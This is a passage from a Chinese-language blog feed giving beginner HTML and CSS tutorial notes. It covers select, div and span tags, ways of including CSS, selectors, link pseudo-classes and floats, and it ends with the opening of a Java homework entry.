<th align="center">属性</th>
<th align="center">值</th>
<th align="center">作用</th>
</tr>
</thead>
<tbody><tr>
<td align="center">cols</td>
<td align="center">自定的正整数</td>
<td align="center">设定文本框列数（宽度）</td>
</tr>
<tr>
<td align="center">rows</td>
<td align="center">自定的正整数</td>
<td align="center">设定文本框行数（高度）</td>
</tr>
</tbody></table>
<h6 id="下拉列表标签"><a href="#下拉列表标签" class="headerlink" title="&lt;select&gt; 下拉列表标签"></a><code>&lt;select&gt;</code> 下拉列表标签</h6><p><code>&lt;select&gt;</code> 元素用来创建下拉列表。</p>
<p><code>&lt;select&gt;</code> 元素中的 <code>&lt;option&gt;</code> 标签定义了列表中的可用选项。</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">select</span> <span class="attr">name</span>=<span class="string">&quot;city&quot;</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">option</span> <span class="attr">value</span>=<span class="string">&quot;1&quot;</span> <span class="attr">selected</span>=<span class="string">&quot;selected&quot;</span>&gt;</span> 1 <span class="tag">&lt;/<span class="name">option</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!-- option为选项 --&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">option</span> <span class="attr">value</span>=<span class="string">&quot;2&quot;</span>&gt;</span> 2 <span class="tag">&lt;/<span class="name">option</span>&gt;</span></span><br><span class="line">    ...</span><br><span class="line"><span class="tag">&lt;/<span class="name">select</span>&gt;</span></span><br></pre></td></tr></table></figure>

<table>
<thead>
<tr>
<th align="center">属性</th>
<th align="center">值</th>
<th align="center">作用</th>
</tr>
</thead>
<tbody><tr>
<td align="center">selected</td>
<td align="center">selected</td>
<td align="center">设定默认选中项</td>
</tr>
</tbody></table>
<h6 id="区块标签"><a href="#区块标签" class="headerlink" title="&lt;div&gt; 区块标签"></a><code>&lt;div&gt;</code> 区块标签</h6><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">style</span>=<span class="string">&quot;color:#0000FF&quot;</span>&gt;</span></span><br><span class="line">    div 标签</span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p><code>&lt;div&gt;</code> 标签定义 HTML 文档中的一个分隔区块或者一个区域部分。</p>
<p><code>&lt;div&gt;</code> 标签常用于组合块级元素，以便通过 CSS 来对这些元素进行格式化。</p>
<h6 id="元素组合标签"><a href="#元素组合标签" class="headerlink" title="&lt;span&gt; 元素组合标签"></a><code>&lt;span&gt;</code> 元素组合标签</h6><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">p</span>&gt;</span>我的母亲有 <span class="tag">&lt;<span class="name">span</span> <span class="attr">style</span>=<span class="string">&quot;color:blue&quot;</span>&gt;</span>蓝色<span class="tag">&lt;/<span class="name">span</span>&gt;</span> 的眼睛。<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p><code>&lt;span&gt;</code> 用于对文档中的行内元素进行组合。</p>
<p><code>&lt;span&gt;</code> 标签没有固定的格式表现。当对它应用样式时，它才会产生视觉上的变化。如果不对 <code>&lt;span&gt;</code> 应用样式，那么 <code>&lt;span&gt;</code> 元素中的文本与其他文本不会任何视觉上的差异。</p>
<p><code>&lt;span&gt;</code> 标签提供了一种将文本的一部分或者文档的一部分独立出来的方式。</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">span</span>&gt;</span><span class="tag">&lt;<span class="name">h6</span>&gt;</span>你好<span class="tag">&lt;/<span class="name">h6</span>&gt;</span>你好你好<span class="tag">&lt;/<span class="name">span</span>&gt;</span></span><br></pre></td></tr></table></figure>

<h1 id="模型"><a href="#模型" class="headerlink" title="模型"></a>模型</h1><h2 id="块状模型"><a href="#块状模型" class="headerlink" title="块状模型"></a>块状模型</h2><p>写入模型的那部分内容会强制占据一部分网页，可通过 CSS 来修改</p>
<h2 id="内联模型"><a href="#内联模型" class="headerlink" title="内联模型"></a>内联模型</h2><p>不管写什么东西都可以将上下的内容连起来</p>
<h1 id="CSS"><a href="#CSS" class="headerlink" title="CSS"></a>CSS</h1><p>层叠样式表，html 的化妆师</p>
<h2 id="注释-1"><a href="#注释-1" class="headerlink" title="注释"></a>注释</h2><figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* ... */</span></span><br></pre></td></tr></table></figure>

<h2 id="CSS-引入方式"><a href="#CSS-引入方式" class="headerlink" title="CSS 引入方式"></a>CSS 引入方式</h2><p>注：下列样式按照优先级排列</p>
<h3 id="行内样式："><a href="#行内样式：" class="headerlink" title="行内样式："></a>行内样式：</h3><table>
<thead>
<tr>
<th align="center">写法</th>
<th align="center">参数</th>
<th align="center">值</th>
<th align="center">作用</th>
</tr>
</thead>
<tbody><tr>
<td align="center"><code>style=&quot;color: red;&quot;</code></td>
<td align="center">color</td>
<td align="center">color</td>
<td align="center">更改文字颜色</td>
</tr>
<tr>
<td align="center"><code>style=&quot;font-size: 100px;&quot;</code></td>
<td align="center">font-size</td>
<td align="center">px</td>
<td align="center">更改文字大小</td>
</tr>
<tr>
<td align="center"><code>style=&quot;font-family: 楷体;&quot;</code></td>
<td align="center">font-family</td>
<td align="center">字体</td>
<td align="center">更改字体</td>
</tr>
<tr>
<td align="center"><code>style=&quot;width: 100px;&quot;</code></td>
<td align="center">width</td>
<td align="center">px</td>
<td align="center">修改宽度</td>
</tr>
<tr>
<td align="center"><code>style=&quot;height: 100px;&quot;</code></td>
<td align="center">height</td>
<td align="center">px</td>
<td align="center">修改高度</td>
</tr>
<tr>
<td align="center"><code>style=&quot;background: blue;&quot;</code></td>
<td align="center">background</td>
<td align="center">color</td>
<td align="center">更改背景颜色</td>
</tr>
</tbody></table>
<p>实例：</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    	<span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;utf-8&quot;</span>&gt;</span></span><br><span class="line">    	<span class="tag">&lt;<span class="name">title</span>&gt;</span>HTML<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"></span><br><span class="line">	<span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">p</span> <span class="attr">style</span>=<span class="string">&quot;font-family: 楷体&quot;</span>&gt;</span>你好<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>

<h3 id="内嵌样式"><a href="#内嵌样式" class="headerlink" title="内嵌样式"></a>内嵌样式</h3><p>  将 <code>style</code> 改为标签放入 <code>&lt;head&gt;</code> 标签中</p>
<p>实例：</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    	<span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;utf-8&quot;</span>&gt;</span></span><br><span class="line">    	<span class="tag">&lt;<span class="name">title</span>&gt;</span>HTML<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">    	<span class="tag">&lt;<span class="name">style</span>&gt;</span><span class="language-css"></span></span><br><span class="line"><span class="language-css">        	<span class="selector-tag">div</span>&#123;</span></span><br><span class="line"><span class="language-css">                <span class="attribute">width</span>: <span class="number">100px</span>;</span></span><br><span class="line"><span class="language-css">                <span class="attribute">height</span>: <span class="number">100px</span>;</span></span><br><span class="line"><span class="language-css">                <span class="attribute">background</span>: red;</span></span><br><span class="line"><span class="language-css">        	&#125;</span></span><br><span class="line"><span class="language-css">    	</span><span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"></span><br><span class="line">	<span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">div</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">p</span>&gt;</span><span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">div</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>如果想让 16 行和 18 行的 <code>&lt;div&gt;</code> 标签颜色不同该怎么做？</p>
<p>亦或者两个样式名都想命名为相同的名字呢？</p>
<h4 id="id-选择器"><a href="#id-选择器" class="headerlink" title="id 选择器"></a>id 选择器</h4><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    	<span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;utf-8&quot;</span>&gt;</span></span><br><span class="line">    	<span class="tag">&lt;<span class="name">title</span>&gt;</span>HTML<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">    	<span class="tag">&lt;<span class="name">style</span>&gt;</span><span class="language-css"></span></span><br><span class="line"><span class="language-css">        	<span class="selector-id">#red</span>&#123;</span></span><br><span class="line"><span class="language-css">                <span class="attribute">width</span>: <span class="number">100px</span>;</span></span><br><span class="line"><span class="language-css">                <span class="attribute">height</span>: <span class="number">100px</span>;</span></span><br><span class="line"><span class="language-css">                <span class="attribute">background</span>: red;</span></span><br><span class="line"><span class="language-css">        	&#125;</span></span><br><span class="line"><span class="language-css">            <span class="selector-id">#blue</span>&#123;</span></span><br><span class="line"><span class="language-css">                <span class="attribute">width</span>: <span class="number">100px</span>;</span></span><br><span class="line"><span class="language-css">                <span class="attribute">height</span>: <span class="number">100px</span>;</span></span><br><span class="line"><span class="language-css">                <span class="attribute">background</span>: blue;</span></span><br><span class="line"><span class="language-css">        	&#125;</span></span><br><span class="line"><span class="language-css">    	</span><span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br><span class="line">        <span class="comment">&lt;!-- 引用 id 时要在前面加上 # 号 --&gt;</span></span><br><span class="line">	<span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"></span><br><span class="line">	<span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;red&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">        <span class="comment">&lt;!-- 自定义 id 名称 --&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">p</span>&gt;</span><span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;blue&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>

<h4 id="类选择器"><a href="#类选择器" class="headerlink" title="类选择器"></a>类选择器</h4><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    	<span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;utf-8&quot;</span>&gt;</span></span><br><span class="line">    	<span class="tag">&lt;<span class="name">title</span>&gt;</span>HTML<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">    	<span class="tag">&lt;<span class="name">style</span>&gt;</span><span class="language-css"></span></span><br><span class="line"><span class="language-css">        	<span class="selector-class">.red</span>&#123;</span></span><br><span class="line"><span class="language-css">                <span class="attribute">width</span>: <span class="number">100px</span>;</span></span><br><span class="line"><span class="language-css">                <span class="attribute">height</span>: <span class="number">100px</span>;</span></span><br><span class="line"><span class="language-css">                <span class="attribute">background</span>: red;</span></span><br><span class="line"><span class="language-css">        	&#125;</span></span><br><span class="line"><span class="language-css">            <span class="selector-class">.blue</span>&#123;</span></span><br><span class="line"><span class="language-css">                <span class="attribute">width</span>: <span class="number">100px</span>;</span></span><br><span class="line"><span class="language-css">                <span class="attribute">height</span>: <span class="number">100px</span>;</span></span><br><span class="line"><span class="language-css">                <span class="attribute">background</span>: blue;</span></span><br><span class="line"><span class="language-css">        	&#125;</span></span><br><span class="line"><span class="language-css">    	</span><span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br><span class="line">        <span class="comment">&lt;!-- 引用 class 时要在前面加上 . 号 --&gt;</span></span><br><span class="line">	<span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"></span><br><span class="line">	<span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;red&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">        <span class="comment">&lt;!-- 自定义 class 名称 --&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">p</span>&gt;</span><span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;blue&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>

<h4 id="后代选择器"><a href="#后代选择器" class="headerlink" title="后代选择器"></a>后代选择器</h4><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    	<span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;utf-8&quot;</span>&gt;</span></span><br><span class="line">    	<span class="tag">&lt;<span class="name">title</span>&gt;</span>HTML<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">    	<span class="tag">&lt;<span class="name">style</span>&gt;</span><span class="language-css"></span></span><br><span class="line"><span class="language-css">        	<span class="selector-class">.box1</span> <span class="selector-tag">ul</span> <span class="selector-tag">li</span>&#123;</span></span><br><span class="line"><span class="language-css">        	    <span class="attribute">color</span>: red;</span></span><br><span class="line"><span class="language-css">        	&#125;</span></span><br><span class="line"><span class="language-css">        	<span class="selector-class">.box2</span> <span class="selector-tag">ul</span> <span class="selector-tag">li</span>&#123;</span></span><br><span class="line"><span class="language-css">        	    <span class="attribute">color</span>: blue;</span></span><br><span class="line"><span class="language-css">        	&#125;</span></span><br><span class="line"><span class="language-css">        	<span class="selector-tag">p</span><span class="selector-class">.pp</span>&#123;</span></span><br><span class="line"><span class="language-css">        	    <span class="attribute">color</span>: yellow;</span></span><br><span class="line"><span class="language-css">       	 	&#125;</span></span><br><span class="line"><span class="language-css">		</span><span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"></span><br><span class="line">	<span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;box1&quot;</span>&gt;</span></span><br><span class="line">    		<span class="tag">&lt;<span class="name">ul</span>&gt;</span></span><br><span class="line">        		<span class="tag">&lt;<span class="name">li</span>&gt;</span> 1 <span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">        		<span class="tag">&lt;<span class="name">li</span>&gt;</span> 2 <span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">    		<span class="tag">&lt;/<span class="name">ul</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;box2&quot;</span>&gt;</span></span><br><span class="line">    		<span class="tag">&lt;<span class="name">ul</span>&gt;</span></span><br><span class="line">        		<span class="tag">&lt;<span class="name">li</span>&gt;</span> 1 <span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">        		<span class="tag">&lt;<span class="name">li</span>&gt;</span> 2 <span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">    		<span class="tag">&lt;/<span class="name">ul</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">    	<span class="tag">&lt;<span class="name">p</span> <span class="attr">class</span>=<span class="string">&quot;pp&quot;</span>&gt;</span>3<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>
<h3 id="外联样式"><a href="#外联样式" class="headerlink" title="外联样式"></a>外联样式</h3><p>将 CSS 写在 .css 文件中并引用</p>
<p>index.css：</p>
<figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="selector-id">#red</span>&#123;</span><br><span class="line">    <span class="attribute">width</span>: <span class="number">100px</span>;</span><br><span class="line">    <span class="attribute">height</span>: <span class="number">100px</span>;</span><br><span class="line">    <span class="attribute">background</span>: red;</span><br><span class="line">&#125;</span><br><span class="line"><span class="selector-class">.blue</span>&#123;</span><br><span class="line">    <span class="attribute">width</span>: <span class="number">100px</span>;</span><br><span class="line">    <span class="attribute">height</span>: <span class="number">100px</span>;</span><br><span class="line">    <span class="attribute">background</span>: blue;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>index.html：</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    	<span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;utf-8&quot;</span>&gt;</span></span><br><span class="line">    	<span class="tag">&lt;<span class="name">title</span>&gt;</span>HTML<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">    	<span class="tag">&lt;<span class="name">link</span> <span class="attr">href</span>=<span class="string">&quot;CSS/index.css&quot;</span> <span class="attr">rel</span>=<span class="string">&quot;stylesheet&quot;</span>/&gt;</span></span><br><span class="line">    	<span class="comment">&lt;!-- rel=&quot;stylesheet&quot; 作用为声明其为样式表，不可省略 --&gt;</span></span><br><span class="line">	<span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"></span><br><span class="line">	<span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;red&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">		<span class="comment">&lt;!-- 自定义 id 名称 --&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">p</span>&gt;</span><span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;blue&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>

<h3 id="导入样式"><a href="#导入样式" class="headerlink" title="导入样式"></a>导入样式</h3><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    	<span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;utf-8&quot;</span>&gt;</span></span><br><span class="line">    	<span class="tag">&lt;<span class="name">title</span>&gt;</span>HTML<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">    	<span class="tag">&lt;<span class="name">style</span>&gt;</span><span class="language-css"></span></span><br><span class="line"><span class="language-css">        	<span class="keyword">@import</span> url(CSS/index.css);</span></span><br><span class="line"><span class="language-css">    	</span><span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br><span class="line">        <span class="comment">&lt;!-- 或者 </span></span><br><span class="line"><span class="comment">		&lt;style&gt;</span></span><br><span class="line"><span class="comment">        	@import url(&quot;CSS/index.css&quot;);</span></span><br><span class="line"><span class="comment">    	&lt;/style&gt;</span></span><br><span class="line"><span class="comment">		--&gt;</span></span><br><span class="line">	<span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"></span><br><span class="line">	<span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;red&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">		<span class="comment">&lt;!-- 自定义 id 名称 --&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">p</span>&gt;</span><span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;blue&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>

<h2 id="实例"><a href="#实例" class="headerlink" title="实例"></a>实例</h2><h3 id="超链接的不同显示方式"><a href="#超链接的不同显示方式" class="headerlink" title="超链接的不同显示方式"></a>超链接的不同显示方式</h3><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    	<span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;utf-8&quot;</span>&gt;</span></span><br><span class="line">    	<span class="tag">&lt;<span class="name">title</span>&gt;</span>HTML<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">    	<span class="tag">&lt;<span class="name">style</span>&gt;</span><span class="language-css"></span></span><br><span class="line"><span class="language-css">            <span class="selector-tag">a</span>&#123;</span></span><br><span class="line"><span class="language-css">            	<span class="attribute">text-decoration</span>: none;</span></span><br><span class="line"><span class="language-css">            	<span class="attribute">color</span>: black;</span></span><br><span class="line"><span class="language-css">        	&#125;</span></span><br><span class="line"><span class="language-css">            <span class="comment">/* 初始化超链接为黑色和无下划线 */</span></span></span><br><span class="line"><span class="language-css">        	<span class="selector-tag">a</span><span class="selector-pseudo">:link</span>&#123;</span></span><br><span class="line"><span class="language-css">            	<span class="attribute">color</span>: blue;</span></span><br><span class="line"><span class="language-css">        	&#125;</span></span><br><span class="line"><span class="language-css">            <span class="comment">/* 将访问之前的颜色改为蓝色 */</span></span></span><br><span class="line"><span class="language-css">        	<span class="selector-tag">a</span><span class="selector-pseudo">:visited</span>&#123;</span></span><br><span class="line"><span class="language-css">            	<span class="attribute">color</span>: purple;</span></span><br><span class="line"><span class="language-css">        	&#125;</span></span><br><span class="line"><span class="language-css">            <span class="comment">/* 如果已访问过一次，则超链接变为紫色 */</span></span></span><br><span class="line"><span class="language-css">        	<span class="selector-tag">a</span><span class="selector-pseudo">:hover</span>&#123;</span></span><br><span class="line"><span class="language-css">            	<span class="attribute">color</span>: aqua;</span></span><br><span class="line"><span class="language-css">            	<span class="attribute">text-decoration</span>: underline;</span></span><br><span class="line"><span class="language-css">        	&#125;</span></span><br><span class="line"><span class="language-css">            <span class="comment">/* 当鼠标触碰到超链接时，超链接颜色&quot;变亮&quot;并出现下滑线 */</span></span></span><br><span class="line"><span class="language-css">    	</span><span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"></span><br><span class="line">	<span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;www.baidu.com&quot;</span>&gt;</span> 百度一下，你就知道 <span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>

<h3 id="悬浮"><a href="#悬浮" class="headerlink" title="悬浮"></a>悬浮</h3><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    	<span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;utf-8&quot;</span>&gt;</span></span><br><span class="line">    	<span class="tag">&lt;<span class="name">title</span>&gt;</span>HTML<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">    	<span class="tag">&lt;<span class="name">style</span>&gt;</span><span class="language-css"></span></span><br><span class="line"><span class="language-css">            *&#123;</span></span><br><span class="line"><span class="language-css">                <span class="attribute">margin</span>: <span class="number">0</span>;</span></span><br><span class="line"><span class="language-css">                <span class="attribute">padding</span>: <span class="number">0</span>;</span></span><br><span class="line"><span class="language-css">            &#125;</span></span><br><span class="line"><span class="language-css">            <span class="comment">/* 初始化页边距为0 */</span></span></span><br><span class="line"><span class="language-css">            <span class="selector-tag">ul</span> <span class="selector-tag">li</span>&#123;</span></span><br><span class="line"><span class="language-css">            	<span class="attribute">list-style</span>: none;</span></span><br><span class="line"><span class="language-css">            	<span class="attribute">float</span>: left;</span></span><br><span class="line"><span class="language-css">            	<span class="attribute">margin-left</span>: <span class="number">20px</span>;</span></span><br><span class="line"><span class="language-css">        	&#125;</span></span><br><span class="line"><span class="language-css">            <span class="comment">/* 设置悬浮方式和间距 */</span></span></span><br><span class="line"><span class="language-css">		</span><span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"></span><br><span class="line">	<span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;box1&quot;</span>&gt;</span></span><br><span class="line">    		<span class="tag">&lt;<span class="name">ul</span>&gt;</span></span><br><span class="line">        		<span class="tag">&lt;<span class="name">li</span>&gt;</span> 新闻 <span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">        		<span class="tag">&lt;<span class="name">li</span>&gt;</span> 新闻 <span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">    		<span class="tag">&lt;/<span class="name">ul</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>

















]]></content>
      <categories>
        <category>HTML</category>
      </categories>
      <tags>
        <tag>HTML</tag>
        <tag>CSS</tag>
      </tags>
  </entry>
  <entry>
    <title>Java 作业 02</title>
    <url>/2024/04/05/Java%20%E4%BD%9C%E4%B8%9A%202/</url>
    <content><![CDATA[<h1 id="7-1-jmu-Java-01入门-第一个PTA上Java程序"><a href="#7-1-jmu-Java-01入门-第一个PTA上Java程序" class="headerlink" title="7-1 jmu-Java-01入门-第一个PTA上Java程序"></a>7-1 jmu-Java-01入门-第一个PTA上Java程序</h1><p>本题目要求读入若干对整数a和b，然后输出它们的和。</p>
